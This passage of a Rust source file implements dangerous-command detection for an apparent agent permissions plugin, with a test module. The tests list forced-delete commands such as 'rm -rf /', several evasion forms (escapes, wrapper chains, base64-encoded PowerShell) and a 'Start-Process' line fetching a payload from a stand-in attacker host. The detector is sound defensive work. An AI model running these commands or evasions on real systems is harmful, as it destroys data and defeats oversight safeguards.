//! Dangerous-command detection (Apache-2.0). Generic: it only
//! names what matched; the permissions plugin decides what that means (ask even in full-access).
//!
//! Literal commands are found anywhere in a script — inside control flow, pipelines and command
//! substitutions — and shell wrappers (`bash -c`, `sudo`, `env`, `trap`) are followed up to
//! [`MAX_DEPTH`] levels. Non-literal arguments are skipped, a non-literal command name drops that
//! command.
//!
//! An `rm` whose
//! operand is an unexpanded variable or a command substitution (`rm "$DIR"`, `rm $(cat list)`,
//! ``rm `ls` ``) matches `forced_rm` even without `-f` — what it deletes can't be known up front.
//! Internally such an argument is kept as the [`DYN`] placeholder; [`literal_commands`] drops it.

use tree_sitter::{Node, Parser};

const MAX_DEPTH: usize = 8;
/// Scripts longer than this aren't parsed (bounded work; the permissions plugin still asks for
/// commands it can't analyze).
const MAX_SCRIPT: usize = 64 * 1024;
/// Placeholder for an argument whose value is only known at run time (`$VAR`, `${…}`, `$(…)`,
/// backquotes, `<(…)`). NUL can't occur in a real argv, so it never collides with a literal.
const DYN: &str = "\0dyn";

/// The built-in rule that matched.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Match {
    /// `rm` with `-f` / `--force`, or whose operand is an unexpanded variable / substitution
    ForcedRm,
    /// Windows: `Remove-Item … -Force`, `del /f`, `rd /s /q` (cmd or PowerShell)
    WindowsForceDelete,
    /// Windows/PowerShell: ShellExecute / browser launch with a URL (`Start-Process`, `cmd /c start`, `explorer`, `rundll32`)
    WindowsShellExecute,
}

impl Match {
    pub fn name(self) -> &'static str {
        match self {
            Self::ForcedRm => "forced_rm",
            Self::WindowsForceDelete => "windows_force_delete",
            Self::WindowsShellExecute => "windows_shell_execute",
        }
    }
}

/// Every literal command in `script` (bash), as argv (non-literal arguments left out).
pub fn literal_commands(script: &str) -> Vec<Vec<String>> {
    let mut cmds = parse_literal(script).unwrap_or_default();
    for c in &mut cmds {
        c.retain(|w| w != DYN);
    }
    cmds
}

/// `None` when the script is too long or doesn't parse (callers that decide safety must then
/// fail closed — see [`word_scan`]).
fn parse_literal(script: &str) -> Option<Vec<Vec<String>>> {
    if script.len() > MAX_SCRIPT {
        return None;
    }
    let mut parser = Parser::new();
    parser.set_language(&tree_sitter_bash::LANGUAGE.into()).ok()?;
    let tree = parser.parse(script, None)?;
    let root = tree.root_node();
    if root.has_error() {
        return None;
    }
    let mut out = vec![];
    let mut stack = vec![root];
    while let Some(node) = stack.pop() {
        if node.kind() == "command"
            && let Some(c) = literal_command(node, script)
        {
            out.push(c);
        }
        // `bash <<EOF … EOF`: a heredoc fed to a shell is shell source
        if node.kind() == "heredoc_body"
            && let Some(stmt) = node.parent().filter(|p| p.kind() == "heredoc_redirect").and_then(|p| p.parent())
            && let Some(cmd) = stmt.child_by_field_name("body").filter(|c| c.kind() == "command")
            && literal_command(cmd, script)
                .and_then(|c| c.first().map(|n| base(n)))
                .is_some_and(|n| matches!(n.as_str(), "bash" | "sh" | "zsh" | "dash" | "ksh"))
        {
            out.extend(parse_literal(node.utf8_text(script.as_bytes()).ok()?)?);
        }
        let mut cur = node.walk();
        for child in node.named_children(&mut cur) {
            stack.push(child);
        }
    }
    out.reverse();
    Some(out)
}

fn literal_command(cmd: Node, src: &str) -> Option<Vec<String>> {
    let mut words = vec![];
    let mut found = false;
    let mut cur = cmd.walk();
    for child in cmd.named_children(&mut cur) {
        if child.kind() == "command_name" {
            words.push(literal_word(child.named_child(0)?, src)?);
            found = true;
        } else if found && let Some(w) = literal_word(child, src) {
            words.push(w);
        } else if found && dynamic(child) {
            words.push(DYN.to_string());
        }
    }
    found.then_some(words)
}

fn unescape_word(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    let mut chars = raw.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('\n') => {}
                Some(n) => out.push(n),
                None => out.push('\\'),
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn unescape_double_quoted(inner: &str) -> String {
    let mut out = String::with_capacity(inner.len());
    let mut chars = inner.chars();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.next() {
                Some('\n') => {}
                Some(n @ ('"' | '\\' | '$' | '`')) => out.push(n),
                Some(n) => {
                    out.push('\\');
                    out.push(n);
                }
                None => out.push('\\'),
            }
        } else {
            out.push(c);
        }
    }
    out
}

fn unescape_ansi_c(inner: &str) -> String {
    let mut out = String::with_capacity(inner.len());
    let mut chars = inner.chars().peekable();
    while let Some(c) = chars.next() {
        if c != '\\' {
            out.push(c);
            continue;
        }
        match chars.next() {
            Some('a') => out.push('\x07'),
            Some('b') => out.push('\x08'),
            Some('e' | 'E') => out.push('\x1b'),
            Some('f') => out.push('\x0c'),
            Some('n') => out.push('\n'),
            Some('r') => out.push('\r'),
            Some('t') => out.push('\t'),
            Some('v') => out.push('\x0b'),
            Some(q @ ('\\' | '\'' | '"' | '?')) => out.push(q),
            Some('x') => {
                let mut val = 0u32;
                let mut count = 0;
                while count < 2 && chars.peek().is_some_and(char::is_ascii_hexdigit) {
                    val = val * 16 + chars.next().unwrap().to_digit(16).unwrap();
                    count += 1;
                }
                if count > 0 {
                    if let Some(ch) = char::from_u32(val) {
                        out.push(ch);
                    }
                } else {
                    out.push_str("\\x");
                }
            }
            Some(u @ ('u' | 'U')) => {
                let max = if u == 'u' { 4 } else { 8 };
                let mut val = 0u32;
                let mut count = 0;
                while count < max && chars.peek().is_some_and(char::is_ascii_hexdigit) {
                    val = val * 16 + chars.next().unwrap().to_digit(16).unwrap();
                    count += 1;
                }
                if count > 0 {
                    if let Some(ch) = char::from_u32(val) {
                        out.push(ch);
                    }
                } else {
                    out.push('\\');
                    out.push(u);
                }
            }
            Some(d @ '0'..='7') => {
                let mut val = d.to_digit(8).unwrap();
                for _ in 0..2 {
                    if let Some(&nx) = chars.peek()
                        && ('0'..='7').contains(&nx)
                    {
                        val = val * 8 + nx.to_digit(8).unwrap();
                        chars.next();
                    } else {
                        break;
                    }
                }
                if let Some(ch) = char::from_u32(val & 0xff) {
                    out.push(ch);
                }
            }
            Some('c') => {
                if let Some(ctrl) = chars.next() {
                    let b = (ctrl as u32) & 0x1f;
                    if let Some(ch) = char::from_u32(b) {
                        out.push(ch);
                    }
                }
            }
            Some(other) => {
                out.push('\\');
                out.push(other);
            }
            None => out.push('\\'),
        }
    }
    out
}

fn literal_word(node: Node, src: &str) -> Option<String> {
    let text = || node.utf8_text(src.as_bytes()).ok().map(str::to_owned);
    match node.kind() {
        "word" | "number" => {
            let mut c = node.walk();
            node.named_children(&mut c).next().is_none().then(text).flatten().map(|s| unescape_word(&s))
        }
        "string" => {
            let mut c = node.walk();
            if node.named_children(&mut c).any(|p| p.kind() != "string_content") {
                return None;
            }
            let raw = text()?;
            Some(unescape_double_quoted(raw.strip_prefix('"')?.strip_suffix('"')?))
        }
        "raw_string" => Some(text()?.strip_prefix('\'')?.strip_suffix('\'')?.to_string()),
        "ansi_c_string" => Some(unescape_ansi_c(text()?.strip_prefix("$'")?.strip_suffix('\'')?)),
        "concatenation" => {
            let mut s = String::new();
            let mut c = node.walk();
            for part in node.named_children(&mut c) {
                s.push_str(&literal_word(part, src)?);
            }
            (!s.is_empty()).then_some(s)
        }
        _ => None,
    }
}

/// An argument whose value comes from an expansion or substitution (redirects and other
/// non-argument children are not arguments).
fn dynamic(node: Node) -> bool {
    match node.kind() {
        "simple_expansion" | "expansion" | "command_substitution" | "process_substitution" => true,
        "string" | "concatenation" => {
            let mut c = node.walk();
            node.named_children(&mut c).any(dynamic)
        }
        _ => false,
    }
}

fn base(raw: &str) -> String {
    let b = raw.rsplit(['/', '\\']).next().unwrap_or(raw).to_ascii_lowercase();
    for suffix in [".exe", ".cmd", ".bat", ".com"] {
        if let Some(s) = b.strip_suffix(suffix) {
            return s.to_string();
        }
    }
    b
}

/// The first built-in rule a command (as written for `shell`, "bash" or "powershell") matches.
/// `windows` turns on the Windows force-delete rules (on Windows, or for PowerShell).
pub fn dangerous(command: &str, powershell: bool, windows: bool) -> Option<Match> {
    if powershell {
        return ps_dangerous(command, 0, windows);
    }
    match parse_literal(command) {
        Some(cmds) => cmds.iter().find_map(|argv| exec_match(argv, 0, windows)),
        None => word_scan(command, windows),
    }
}

/// Evaluate the built-in dangerous-command rules against an already split `argv` vector.
pub fn dangerous_argv(argv: &[String], windows: bool) -> Option<Match> {
    exec_match(argv, 0, windows)
}

/// Fail-closed fallback for scripts that are too long or don't parse: plain words, split on
/// whitespace, quotes and shell punctuation, with no grammar. A forced delete is reported when
/// its pieces appear in the same `;`/`&`/`|`/newline-separated stretch; quoting can only make
/// this over-report, never hide a command.
fn word_scan(script: &str, windows: bool) -> Option<Match> {
    // a backquote ends the segment before it: leave a `$` there so `rm `ls`` still shows an
    // expanded operand
    let norm = script.replace('`', " $`");
    norm.split([';', '&', '|', '\n', '\r', '(', ')', '`', '{', '}']).find_map(|seg| {
        let words: Vec<String> = seg
            .split(|c: char| c.is_whitespace() || matches!(c, '\'' | '"' | '<' | '>'))
            .filter(|w| !w.is_empty())
            .map(|w| if w.contains('$') { DYN.to_string() } else { unescape_word(w) })
            .collect();
        (0..words.len()).find_map(|i| {
            exec_match_inner(&words[i..], MAX_DEPTH, windows, false).filter(|_| {
                // only from a word that could be a command name
                i == 0 || !words[i - 1].starts_with('-')
            })
        })
    })
}

fn script_match_inner(script: &str, depth: usize, windows: bool, fail_on_depth: bool) -> Option<Match> {
    if depth >= MAX_DEPTH {
        return fail_on_depth.then_some(Match::ForcedRm);
    }
    match parse_literal(script) {
        Some(cmds) => cmds.iter().find_map(|c| exec_match_inner(c, depth + 1, windows, fail_on_depth)),
        None => word_scan(script, windows),
    }
}

fn exec_match(argv: &[String], depth: usize, windows: bool) -> Option<Match> {
    exec_match_inner(argv, depth, windows, true)
}

fn exec_match_inner(argv: &[String], depth: usize, windows: bool, fail_on_depth: bool) -> Option<Match> {
    if argv.is_empty() {
        return None;
    }
    if depth > MAX_DEPTH {
        return fail_on_depth.then_some(Match::ForcedRm);
    }
    let cmd = base(&argv[0]);
    let rest = &argv[1..];
    match cmd.as_str() {
        "rm" if rm_forced(rest) => return Some(Match::ForcedRm),
        "eval" => {
            let body = if rest.first().is_some_and(|a| a == "--") { &rest[1..] } else { rest };
            if !body.is_empty() {
                return script_match_inner(&body.join(" "), depth, windows, fail_on_depth);
            }
        }
        // wrappers that run their operand: skip their own options (and option values), then
        // check the wrapped command
        _ if is_wrapper(&cmd) => {
            if let Some(i) = wrapped_start(&cmd, rest) {
                return exec_match_inner(&rest[i.min(rest.len())..], depth + 1, windows, fail_on_depth);
            }
            if cmd == "env"
                && let Some(payload) = env_split_string_payload(rest)
            {
                return script_match_inner(&payload, depth, windows, fail_on_depth);
            }
        }
        // find … -delete, find … -exec[dir] <cmd> … ;|+
        "find" => {
            if rest.iter().any(|a| a == "-delete") {
                return Some(Match::ForcedRm);
            }
            let mut it = rest.iter();
            while let Some(a) = it.next() {
                if matches!(a.as_str(), "-exec" | "-execdir" | "-ok" | "-okdir") {
                    let inner: Vec<String> =
                        it.by_ref().take_while(|w| !matches!(w.as_str(), ";" | "\\;" | "+")).cloned().collect();
                    if let Some(m) = exec_match_inner(&inner, depth + 1, windows, fail_on_depth) {
                        return Some(m);
                    }
                }
            }
        }
        // trap [--] '<action>' …: the action is shell source
        "trap" => {
            let i = usize::from(rest.first().is_some_and(|a| a == "--"));
            let action = rest.get(i).filter(|a| !a.starts_with('-'))?;
            return script_match_inner(action, depth, windows, fail_on_depth);
        }
        // bash -c / -lc / -o errexit -c / -c -- / -c -l '<script>' (and sh, zsh, …)
        "bash" | "sh" | "zsh" | "dash" | "ksh" | "ash" => {
            let mut saw_c = false;
            let mut script = None;
            let mut it = rest.iter();
            while let Some(a) = it.next() {
                if a == "--" {
                    script = it.next();
                    break;
                }
                if matches!(a.as_str(), "-o" | "+o" | "-O" | "+O") {
                    let _ = it.next();
                    continue;
                }
                if (a.starts_with('-') || a.starts_with('+')) && a.len() > 1 {
                    if a.starts_with('-') && !a.starts_with("--") && a.contains('c') {
                        saw_c = true;
                    }
                    continue;
                }
                script = Some(a);
                break;
            }
            if saw_c && let Some(s) = script {
                return script_match_inner(s, depth, windows, fail_on_depth);
            }
        }
        // pwsh / powershell run cross-platform (Linux/macOS/Windows) and support `-Force` deletes
        "pwsh" | "powershell" => {
            if let Some(encoded) = ps_encoded_command(rest) {
                return match decode_ps_encoded_command(&encoded) {
                    Some(decoded) => ps_dangerous(&decoded, depth + 1, windows),
                    None => fail_on_depth.then_some(Match::WindowsForceDelete),
                };
            }
            let script = rest
                .iter()
                .position(|a| ps_flag_prefix(a, "-c", "-command"))
                .map(|p| rest[p + 1..].join(" "))
                .unwrap_or_else(|| rest.join(" "));
            return ps_dangerous(&script, depth + 1, windows);
        }
        _ => {}
    }
    if windows {
        if cmd == "cmd" && cmd_force_delete(rest) {
            return Some(Match::WindowsForceDelete);
        }
        let flag = |f: &str| rest.iter().any(|a| a.eq_ignore_ascii_case(f));
        if matches!(cmd.as_str(), "del" | "erase") && flag("/f") {
            return Some(Match::WindowsForceDelete);
        }
        if matches!(cmd.as_str(), "rd" | "rmdir") && flag("/s") && flag("/q") {
            return Some(Match::WindowsForceDelete);
        }
        if shell_execute_url(argv) {
            return Some(Match::WindowsShellExecute);
        }
    }
    None
}

/// Wrappers shared by dangerous-command analysis and permission rule parsing.
fn is_wrapper(cmd: &str) -> bool {
    matches!(
        cmd,
        "sudo"
            | "doas"
            | "env"
            | "command"
            | "exec"
            | "nohup"
            | "nice"
            | "timeout"
            | "xargs"
            | "time"
            | "stdbuf"
            | "chronic"
            | "busybox"
    )
}

/// Peel known command wrappers for conservative deny/prompt matching. Never use this for allow rules.
pub fn unwrap_argv(argv: &[String]) -> Vec<String> {
    let mut rest = argv;
    for _ in 0..MAX_DEPTH {
        let Some(first) = rest.first() else { break };
        let name = base(first);
        if !is_wrapper(&name) || rest.len() < 2 {
            break;
        }
        let Some(offset) = wrapped_start(&name, &rest[1..]) else {
            break;
        };
        rest = &rest[(1 + offset).min(rest.len())..];
    }
    rest.to_vec()
}

/// `command -v` / `command -V` (including combined flags like `-pv`) is a lookup/query, not
/// command execution.
fn is_command_query(rest: &[String]) -> bool {
    for a in rest {
        if a == "--" {
            return false;
        }
        if a.starts_with('-') && a.len() > 1 {
            if !a.starts_with("--") && a[1..].contains(['v', 'V']) {
                return true;
            }
        } else {
            return false;
        }
    }
    false
}

/// Index of the wrapped command in a wrapper's arguments: its options, the values of options
/// that take one, `NAME=value` (env) and the duration (timeout) are skipped. Returns `None` when
/// the invocation is not a command-execution wrapper (e.g. `command -v` / `command -V`).
fn wrapped_start(wrapper: &str, rest: &[String]) -> Option<usize> {
    if wrapper == "command" && is_command_query(rest) {
        return None;
    }
    let takes_value: &[&str] = match wrapper {
        "sudo" => &["-u", "-g", "-U", "-C", "-D", "-h", "-p", "-r", "-t", "-T", "--user", "--group"],
        "doas" => &["-u", "-C"],
        "env" => &["-u", "--unset", "-C", "--chdir"],
        "nice" => &["-n", "--adjustment"],
        "timeout" => &["-s", "--signal", "-k", "--kill-after"],
        "xargs" => &["-I", "-L", "-n", "-P", "-s", "-d", "-E", "-a", "--delimiter", "--max-args"],
        "exec" => &["-a"],
        "stdbuf" => &["-i", "-o", "-e"],
        _ => &[],
    };
    let mut i = 0;
    while let Some(a) = rest.get(i) {
        if a == "--" {
            return Some(i + 1);
        }
        if wrapper == "env"
            && (a == "-S" || a == "--split-string" || a.starts_with("-S") || a.starts_with("--split-string="))
        {
            return None;
        }
        if takes_value.contains(&a.as_str()) {
            i += 2;
        } else if a.starts_with('-') && a.len() > 1 {
            i += 1;
        } else if wrapper == "env" && a.split_once('=').is_some_and(|(n, _)| !n.is_empty()) {
            i += 1;
        } else if wrapper == "timeout" && a.trim_end_matches(['s', 'm', 'h', 'd']).parse::<f64>().is_ok() {
            return Some(i + 1);
        } else {
            break;
        }
    }
    Some(i)
}

fn env_split_string_payload(rest: &[String]) -> Option<String> {
    let mut it = rest.iter();
    while let Some(a) = it.next() {
        if a == "--" {
            return None;
        }
        if a == "-S" || a == "--split-string" {
            return it.next().cloned();
        }
        if let Some(inline) = a.strip_prefix("--split-string=").or_else(|| a.strip_prefix("-S")) {
            return (!inline.is_empty()).then(|| inline.to_string());
        }
    }
    None
}

fn ps_flag_prefix(arg: &str, min_prefix: &str, full: &str) -> bool {
    let lower = arg.to_ascii_lowercase();
    let name = lower.split(':').next().unwrap_or(&lower);
    let name = name.strip_prefix('/').map(|s| format!("-{s}")).unwrap_or_else(|| name.to_string());
    name.starts_with(min_prefix) && full.starts_with(&name)
}

fn ps_encoded_command(rest: &[String]) -> Option<String> {
    for (i, a) in rest.iter().enumerate() {
        let lower = a.to_ascii_lowercase();
        let norm = lower.strip_prefix('/').map(|s| format!("-{s}")).unwrap_or(lower);
        let flag = norm.split(':').next().unwrap_or(&norm);
        if (flag == "-e" || flag == "-ec" || (flag.starts_with("-en") && "-encodedcommand".starts_with(flag)))
            && !ps_flag_prefix(a, "-ex", "-executionpolicy")
        {
            if let Some((_, inline)) = a.split_once(':') {
                return Some(inline.to_string());
            }
            return rest.get(i + 1).cloned();
        }
    }
    None
}

fn decode_ps_encoded_command(b64: &str) -> Option<String> {
    use base64::Engine as _;
    let bytes = base64::engine::general_purpose::STANDARD.decode(b64.trim()).ok()?;
    if bytes.is_empty() || !bytes.len().is_multiple_of(2) {
        return None;
    }
    let u16s: Vec<u16> = bytes.as_chunks::<2>().0.iter().copied().map(u16::from_le_bytes).collect();
    String::from_utf16(&u16s).ok()
}

fn tokenize_ps(script: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_word = false;
    let mut chars = script.chars().peekable();
    while let Some(c) = chars.next() {
        match c {
            '`' => {
                in_word = true;
                if let Some(n) = chars.next()
                    && n != '\n'
                    && n != '\r'
                {
                    cur.push(n);
                }
            }
            '\'' => {
                in_word = true;
                while let Some(ch) = chars.next() {
                    if ch == '\'' {
                        if chars.peek() == Some(&'\'') {
                            chars.next();
                            cur.push('\'');
                        } else {
                            break;
                        }
                    } else {
                        cur.push(ch);
                    }
                }
            }
            '"' => {
                in_word = true;
                while let Some(ch) = chars.next() {
                    if ch == '`' {
                        if let Some(n) = chars.next() {
                            cur.push(n);
                        }
                    } else if ch == '"' {
                        break;
                    } else {
                        cur.push(ch);
                    }
                }
            }
            ';' | '|' | '&' | '\n' | '\r' => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
                out.push(c.to_string());
            }
            c if c.is_whitespace() => {
                if in_word {
                    out.push(std::mem::take(&mut cur));
                    in_word = false;
                }
            }
            other => {
                in_word = true;
                cur.push(other);
            }
        }
    }
    if in_word {
        out.push(cur);
    }
    out
}

fn ps_dangerous(script: &str, depth: usize, windows: bool) -> Option<Match> {
    if depth > MAX_DEPTH {
        return Some(Match::WindowsForceDelete);
    }
    let words = tokenize_ps(script);
    if force_delete_cmdlet(&words) {
        return Some(Match::WindowsForceDelete);
    }
    if words.split(|w| matches!(w.as_str(), ";" | "|" | "&" | "\n" | "\r")).any(|seg| {
        if seg.is_empty() {
            return false;
        }
        let c = base(&seg[0]);
        let r = &seg[1..];
        (c == "cmd" && cmd_force_delete(r))
            || (matches!(c.as_str(), "del" | "erase") && r.iter().any(|a| a.eq_ignore_ascii_case("/f")))
            || (matches!(c.as_str(), "rd" | "rmdir")
                && r.iter().any(|a| a.eq_ignore_ascii_case("/s"))
                && r.iter().any(|a| a.eq_ignore_ascii_case("/q")))
            || (windows && c == "rm" && rm_forced(r))
    }) {
        return Some(Match::WindowsForceDelete);
    }
    if words.split(|w| matches!(w.as_str(), ";" | "|" | "&" | "\n" | "\r")).any(shell_execute_url) {
        return Some(Match::WindowsShellExecute);
    }
    None
}

fn contains_url_scheme(s: &str) -> bool {
    let lower = s.to_ascii_lowercase();
    lower.contains("http://")
        || lower.contains("https://")
        || lower.contains("file://")
        || lower.contains("ftp://")
        || lower.contains("ms-msdt:")
}

fn shell_execute_url(seg: &[String]) -> bool {
    if seg.is_empty() {
        return false;
    }
    let cmd = base(&seg[0]);
    let rest = &seg[1..];
    if matches!(cmd.as_str(), "start-process" | "saps" | "start" | "invoke-item" | "ii" | "explorer") {
        return rest.iter().any(|a| contains_url_scheme(a));
    }
    if cmd == "cmd" {
        let joined = rest.join(" ");
        let lower = joined.to_ascii_lowercase();
        if lower.contains("start ") && contains_url_scheme(&lower) {
            return true;
        }
    }
    if cmd == "rundll32" {
        let joined = rest.join(" ").to_ascii_lowercase();
        if joined.contains("fileprotocolhandler") && contains_url_scheme(&joined) {
            return true;
        }
    }
    false
}

/// `-f` / `--force` before `--`, or any operand that is an unexpanded variable / substitution.
fn rm_forced(args: &[String]) -> bool {
    args.iter().any(|a| a == DYN)
        || args
            .iter()
            .take_while(|a| a.as_str() != "--")
            .any(|a| a == "--force" || a.strip_prefix('-').is_some_and(|f| !f.starts_with('-') && f.contains('f')))
}

/// `cmd /c del /f …`, `cmd /c rd /s /q …`.
fn cmd_force_delete(rest: &[String]) -> bool {
    let mut it = rest.iter();
    for a in it.by_ref() {
        let l = a.to_ascii_lowercase();
        match l.as_str() {
            "/c" | "/r" | "-c" => break,
            _ if l.starts_with('/') => continue,
            _ => return false,
        }
    }
    let body: Vec<String> = it.cloned().collect();
    let tokens: Vec<String> = match body.as_slice() {
        [only] => shlex::split(only).unwrap_or_else(|| vec![only.clone()]),
        _ => body,
    };
    tokens.split(|t| matches!(t.as_str(), "&" | "&&" | "|" | "||")).any(|seg| {
        let Some(c) = seg.first() else { return false };
        let flag = |f: &str| seg.iter().any(|a| a.eq_ignore_ascii_case(f));
        ((c.eq_ignore_ascii_case("del") || c.eq_ignore_ascii_case("erase")) && flag("/f"))
            || ((c.eq_ignore_ascii_case("rd") || c.eq_ignore_ascii_case("rmdir")) && flag("/s") && flag("/q"))
    })
}

/// A delete cmdlet with `-Force` in the same segment.
fn force_delete_cmdlet(tokens: &[String]) -> bool {
    const DELETE: &[&str] = &["remove-item", "ri", "rm", "del", "erase", "rd", "rmdir"];
    const SEG: &[char] = &[';', '|', '&', '\n', '\r', '\t'];
    const SOFT: &[char] = &['{', '}', '(', ')', '[', ']', ','];
    let mut segments: Vec<Vec<String>> = vec![vec![]];
    for tok in tokens {
        let mut cur = String::new();
        for ch in tok.chars() {
            if SEG.contains(&ch) {
                if !cur.trim().is_empty() {
                    segments.last_mut().unwrap().push(cur.trim().to_string());
                }
                cur.clear();
                if !segments.last().unwrap().is_empty() {
                    segments.push(vec![]);
                }
            } else {
                cur.push(ch);
            }
        }
        if !cur.trim().is_empty() {
            segments.last_mut().unwrap().push(cur.trim().to_string());
        }
    }
    segments.iter().any(|seg| {
        let atoms: Vec<&str> =
            seg.iter().flat_map(|t| t.split(|c| SOFT.contains(&c))).map(str::trim).filter(|s| !s.is_empty()).collect();
        let del = atoms.iter().any(|a| DELETE.iter().any(|d| a.trim_matches(['\'', '"']).eq_ignore_ascii_case(d)));
        let force = atoms.iter().any(|a| {
            let trimmed = a.trim_matches(['\'', '"']);
            ps_flag_prefix(trimmed, "-fo", "-force")
                || (del
                    && atoms.iter().any(|c| c.trim_matches(['\'', '"']).eq_ignore_ascii_case("rm"))
                    && trimmed.strip_prefix('-').is_some_and(|f| !f.starts_with('-') && f.contains('f')))
        });
        del && force
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn bash(s: &str) -> Option<Match> {
        dangerous(s, false, false)
    }

    #[test]
    fn forced_rm_is_found_through_syntax_and_wrappers() {
        for s in [
            "rm -rf /",
            "rm -r -f /tmp/x",
            "/bin/rm --force x",
            "rm x -f",
            "sudo rm -rf /tmp/x",
            "env TARGET=/tmp/x rm -rf /tmp/x",
            "printf x | rm -rf /tmp/x",
            "if test -d /tmp/x; then rm --force /tmp/x; fi",
            "rm -rf \"$TARGET\" >/dev/null",
            "echo \"$(rm -rf /tmp/x)\"",
            "bash -c 'rm -rf /tmp/x'",
            "bash -lc 'sudo env A=1 rm -fr /tmp/x'",
            "bash -c -- 'rm -rf /tmp/x'",
            "bash -c -l 'rm -rf /tmp/x'",
            "bash -c 'rm -rf /tmp/x; )'",
            "trap 'rm -rf /tmp/x' EXIT",
            "trap 'rm -rf /tmp/x; )' EXIT",
            // option values and wrappers (peer batch five, item 10)
            "sudo -u root rm -rf /tmp/x",
            "env -u HOME rm -rf /tmp/x",
            "env -i -- rm -f x",
            "command rm -f x",
            "exec rm -f x",
            "nohup rm -rf x",
            "timeout 5 rm -rf x",
            "timeout -s KILL 5s rm -rf x",
            "nice -n 5 rm -rf x",
            "ls | xargs -I{} rm -rf {}",
            "xargs rm -f < list",
            "find . -name '*.o' -delete",
            "find . -exec rm -rf {} \\;",
            "busybox rm -rf dist",
            "/bin/busybox rm -rf dist",
            "busybox.exe rm -rf dist",
            "bash <<'EOF'\nrm -rf /tmp/x\nEOF",
            // unparsable / oversize: fail closed
            "rm -rf x; )",
            "if true; then rm -rf x",
            "echo 'unterminated; rm -rf x",
        ] {
            assert_eq!(bash(s), Some(Match::ForcedRm), "{s}");
        }
    }

    /// .5: a delete target that can't be resolved up front asks even without -f.
    #[test]
    fn rm_of_an_unexpanded_target_is_dangerous_without_force() {
        for s in [
            "rm $DIR",
            "rm -r \"$TARGET\"",
            "rm ${BUILD}/out",
            "rm \"$HOME\"/x",
            "rm -- $X",
            "rm $(cat list)",
            "rm `ls`",
            "rm -r \"$(git rev-parse --show-toplevel)/tmp\"",
            "for f in *.o; do rm \"$f\"; done",
            "sudo rm $X",
            "bash -c 'rm -r \"$X\"'",
            "find . -exec rm $X \\;",
            // unparsable: the word scan sees the expansion too
            "rm $X; )",
            "rm `ls`; )",
            "rm \"$(ls)\"; )",
        ] {
            assert_eq!(bash(s), Some(Match::ForcedRm), "{s}");
        }
        for s in [
            "rm x.o",
            "rm -r build/*.o",
            "echo $X; rm y",
            "rm y > \"$LOG\"",
            "X=1 rm y",
            "rm y; )",
            "ls $X | xargs echo",
        ] {
            assert_eq!(bash(s), None, "{s}");
        }
        // the argv handed to rule matching never carries the placeholder
        assert_eq!(literal_commands("rm -r \"$X\" y"), vec![vec!["rm".to_string(), "-r".into(), "y".into()]]);
    }

    #[test]
    fn other_commands_are_not_dangerous() {
        for s in [
            "rm -r /tmp/x",
            "rm -- -f",
            "echo 'rm -rf /tmp/x'",
            "cmd=rm; $cmd -rf /tmp/x",
            "env T=1 rm -r /tmp/x",
            "trap 'echo rm -rf /tmp/x' EXIT",
            "git status",
            "sudo -u rm ls",
            "find . -name x",
            "busybox --list",
            "busybox echo ok",
            "command -v rm -rf /",
            "command -V rm -rf /",
        ] {
            assert_eq!(bash(s), None, "{s}");
        }
        assert_eq!(bash("command rm -rf /tmp/x"), Some(Match::ForcedRm));
        assert_eq!(
            unwrap_argv(&["command", "-v", "sh", "git"].map(str::to_string)),
            vec!["command", "-v", "sh", "git"]
        );
        assert_eq!(
            unwrap_argv(&["command", "sh", "-c", "rm -rf dist"].map(str::to_string)),
            vec!["sh", "-c", "rm -rf dist"]
        );
    }

    #[test]
    fn oversize_scripts_fail_closed() {
        let pad = "echo ok; ".repeat(MAX_SCRIPT / 8);
        assert_eq!(bash(&format!("{pad}rm -rf /tmp/x")), Some(Match::ForcedRm));
        assert_eq!(bash(&format!("{pad}rm -r /tmp/x")), None);
    }

    #[test]
    fn windows_force_deletes() {
        assert_eq!(dangerous("Remove-Item build -Recurse -Force", true, true), Some(Match::WindowsForceDelete));
        assert_eq!(dangerous("Remove-Item \"C:\\dir\\\" \"-Force\"", true, true), Some(Match::WindowsForceDelete));
        assert_eq!(dangerous("Get-ChildItem; Remove-Item x", true, true), None);
        assert_eq!(dangerous("cmd /c \"del /f x.txt\"", false, true), Some(Match::WindowsForceDelete));
        assert_eq!(dangerous("rd /s /q build", false, true), Some(Match::WindowsForceDelete));
        assert_eq!(dangerous("rd /s /q build", false, false), None, "Windows rules only on Windows");
        // Cross-platform pwsh invocations (Linux/macOS included) still catch Remove-Item -Force
        assert_eq!(
            dangerous("env pwsh -Command \"Remove-Item target -Force\"", false, false),
            Some(Match::WindowsForceDelete)
        );
        assert_eq!(
            dangerous_argv(&["env", "pwsh", "-Command", "Remove-Item target -Force"].map(str::to_string), false,),
            Some(Match::WindowsForceDelete)
        );
        assert_eq!(
            dangerous("Remove-Item build -fo", true, false),
            Some(Match::WindowsForceDelete),
            "PowerShell parameter abbreviation -fo"
        );
        assert_eq!(
            dangerous(r"r`m -Fo`rce build", true, false),
            Some(Match::WindowsForceDelete),
            "PowerShell backtick escape"
        );
        // UTF-16LE base64 for "Remove-Item build -Force"
        let b64 = {
            use base64::Engine as _;
            let u16s: Vec<u8> = "Remove-Item build -Force".encode_utf16().flat_map(u16::to_le_bytes).collect();
            base64::engine::general_purpose::STANDARD.encode(u16s)
        };
        assert_eq!(dangerous(&format!("pwsh -EncodedCommand {b64}"), false, false), Some(Match::WindowsForceDelete));
        assert_eq!(
            dangerous("Start-Process https://attacker.example/payload", true, false),
            Some(Match::WindowsShellExecute)
        );
    }

    #[test]
    fn shell_evasion_and_wrapper_depth_hardening() {
        for s in [
            "env -S 'rm -rf /tmp/x'",
            "env --split-string='rm -rf /tmp/x'",
            "bash -o errexit -c 'rm -rf /tmp/x'",
            "eval rm -rf /tmp/x",
            "eval 'rm -rf /tmp/x'",
            r"r\m -rf /tmp/x",
            r"$'rm' $'-rf' /tmp/x",
            &format!("{}rm -rf /tmp/x", "sudo ".repeat(MAX_DEPTH + 2)),
            &format!("{}rm -rf /tmp/x", "echo ok; ".repeat(MAX_SCRIPT * 5 / 9)),
        ] {
            assert_eq!(bash(s), Some(Match::ForcedRm), "{s}");
        }
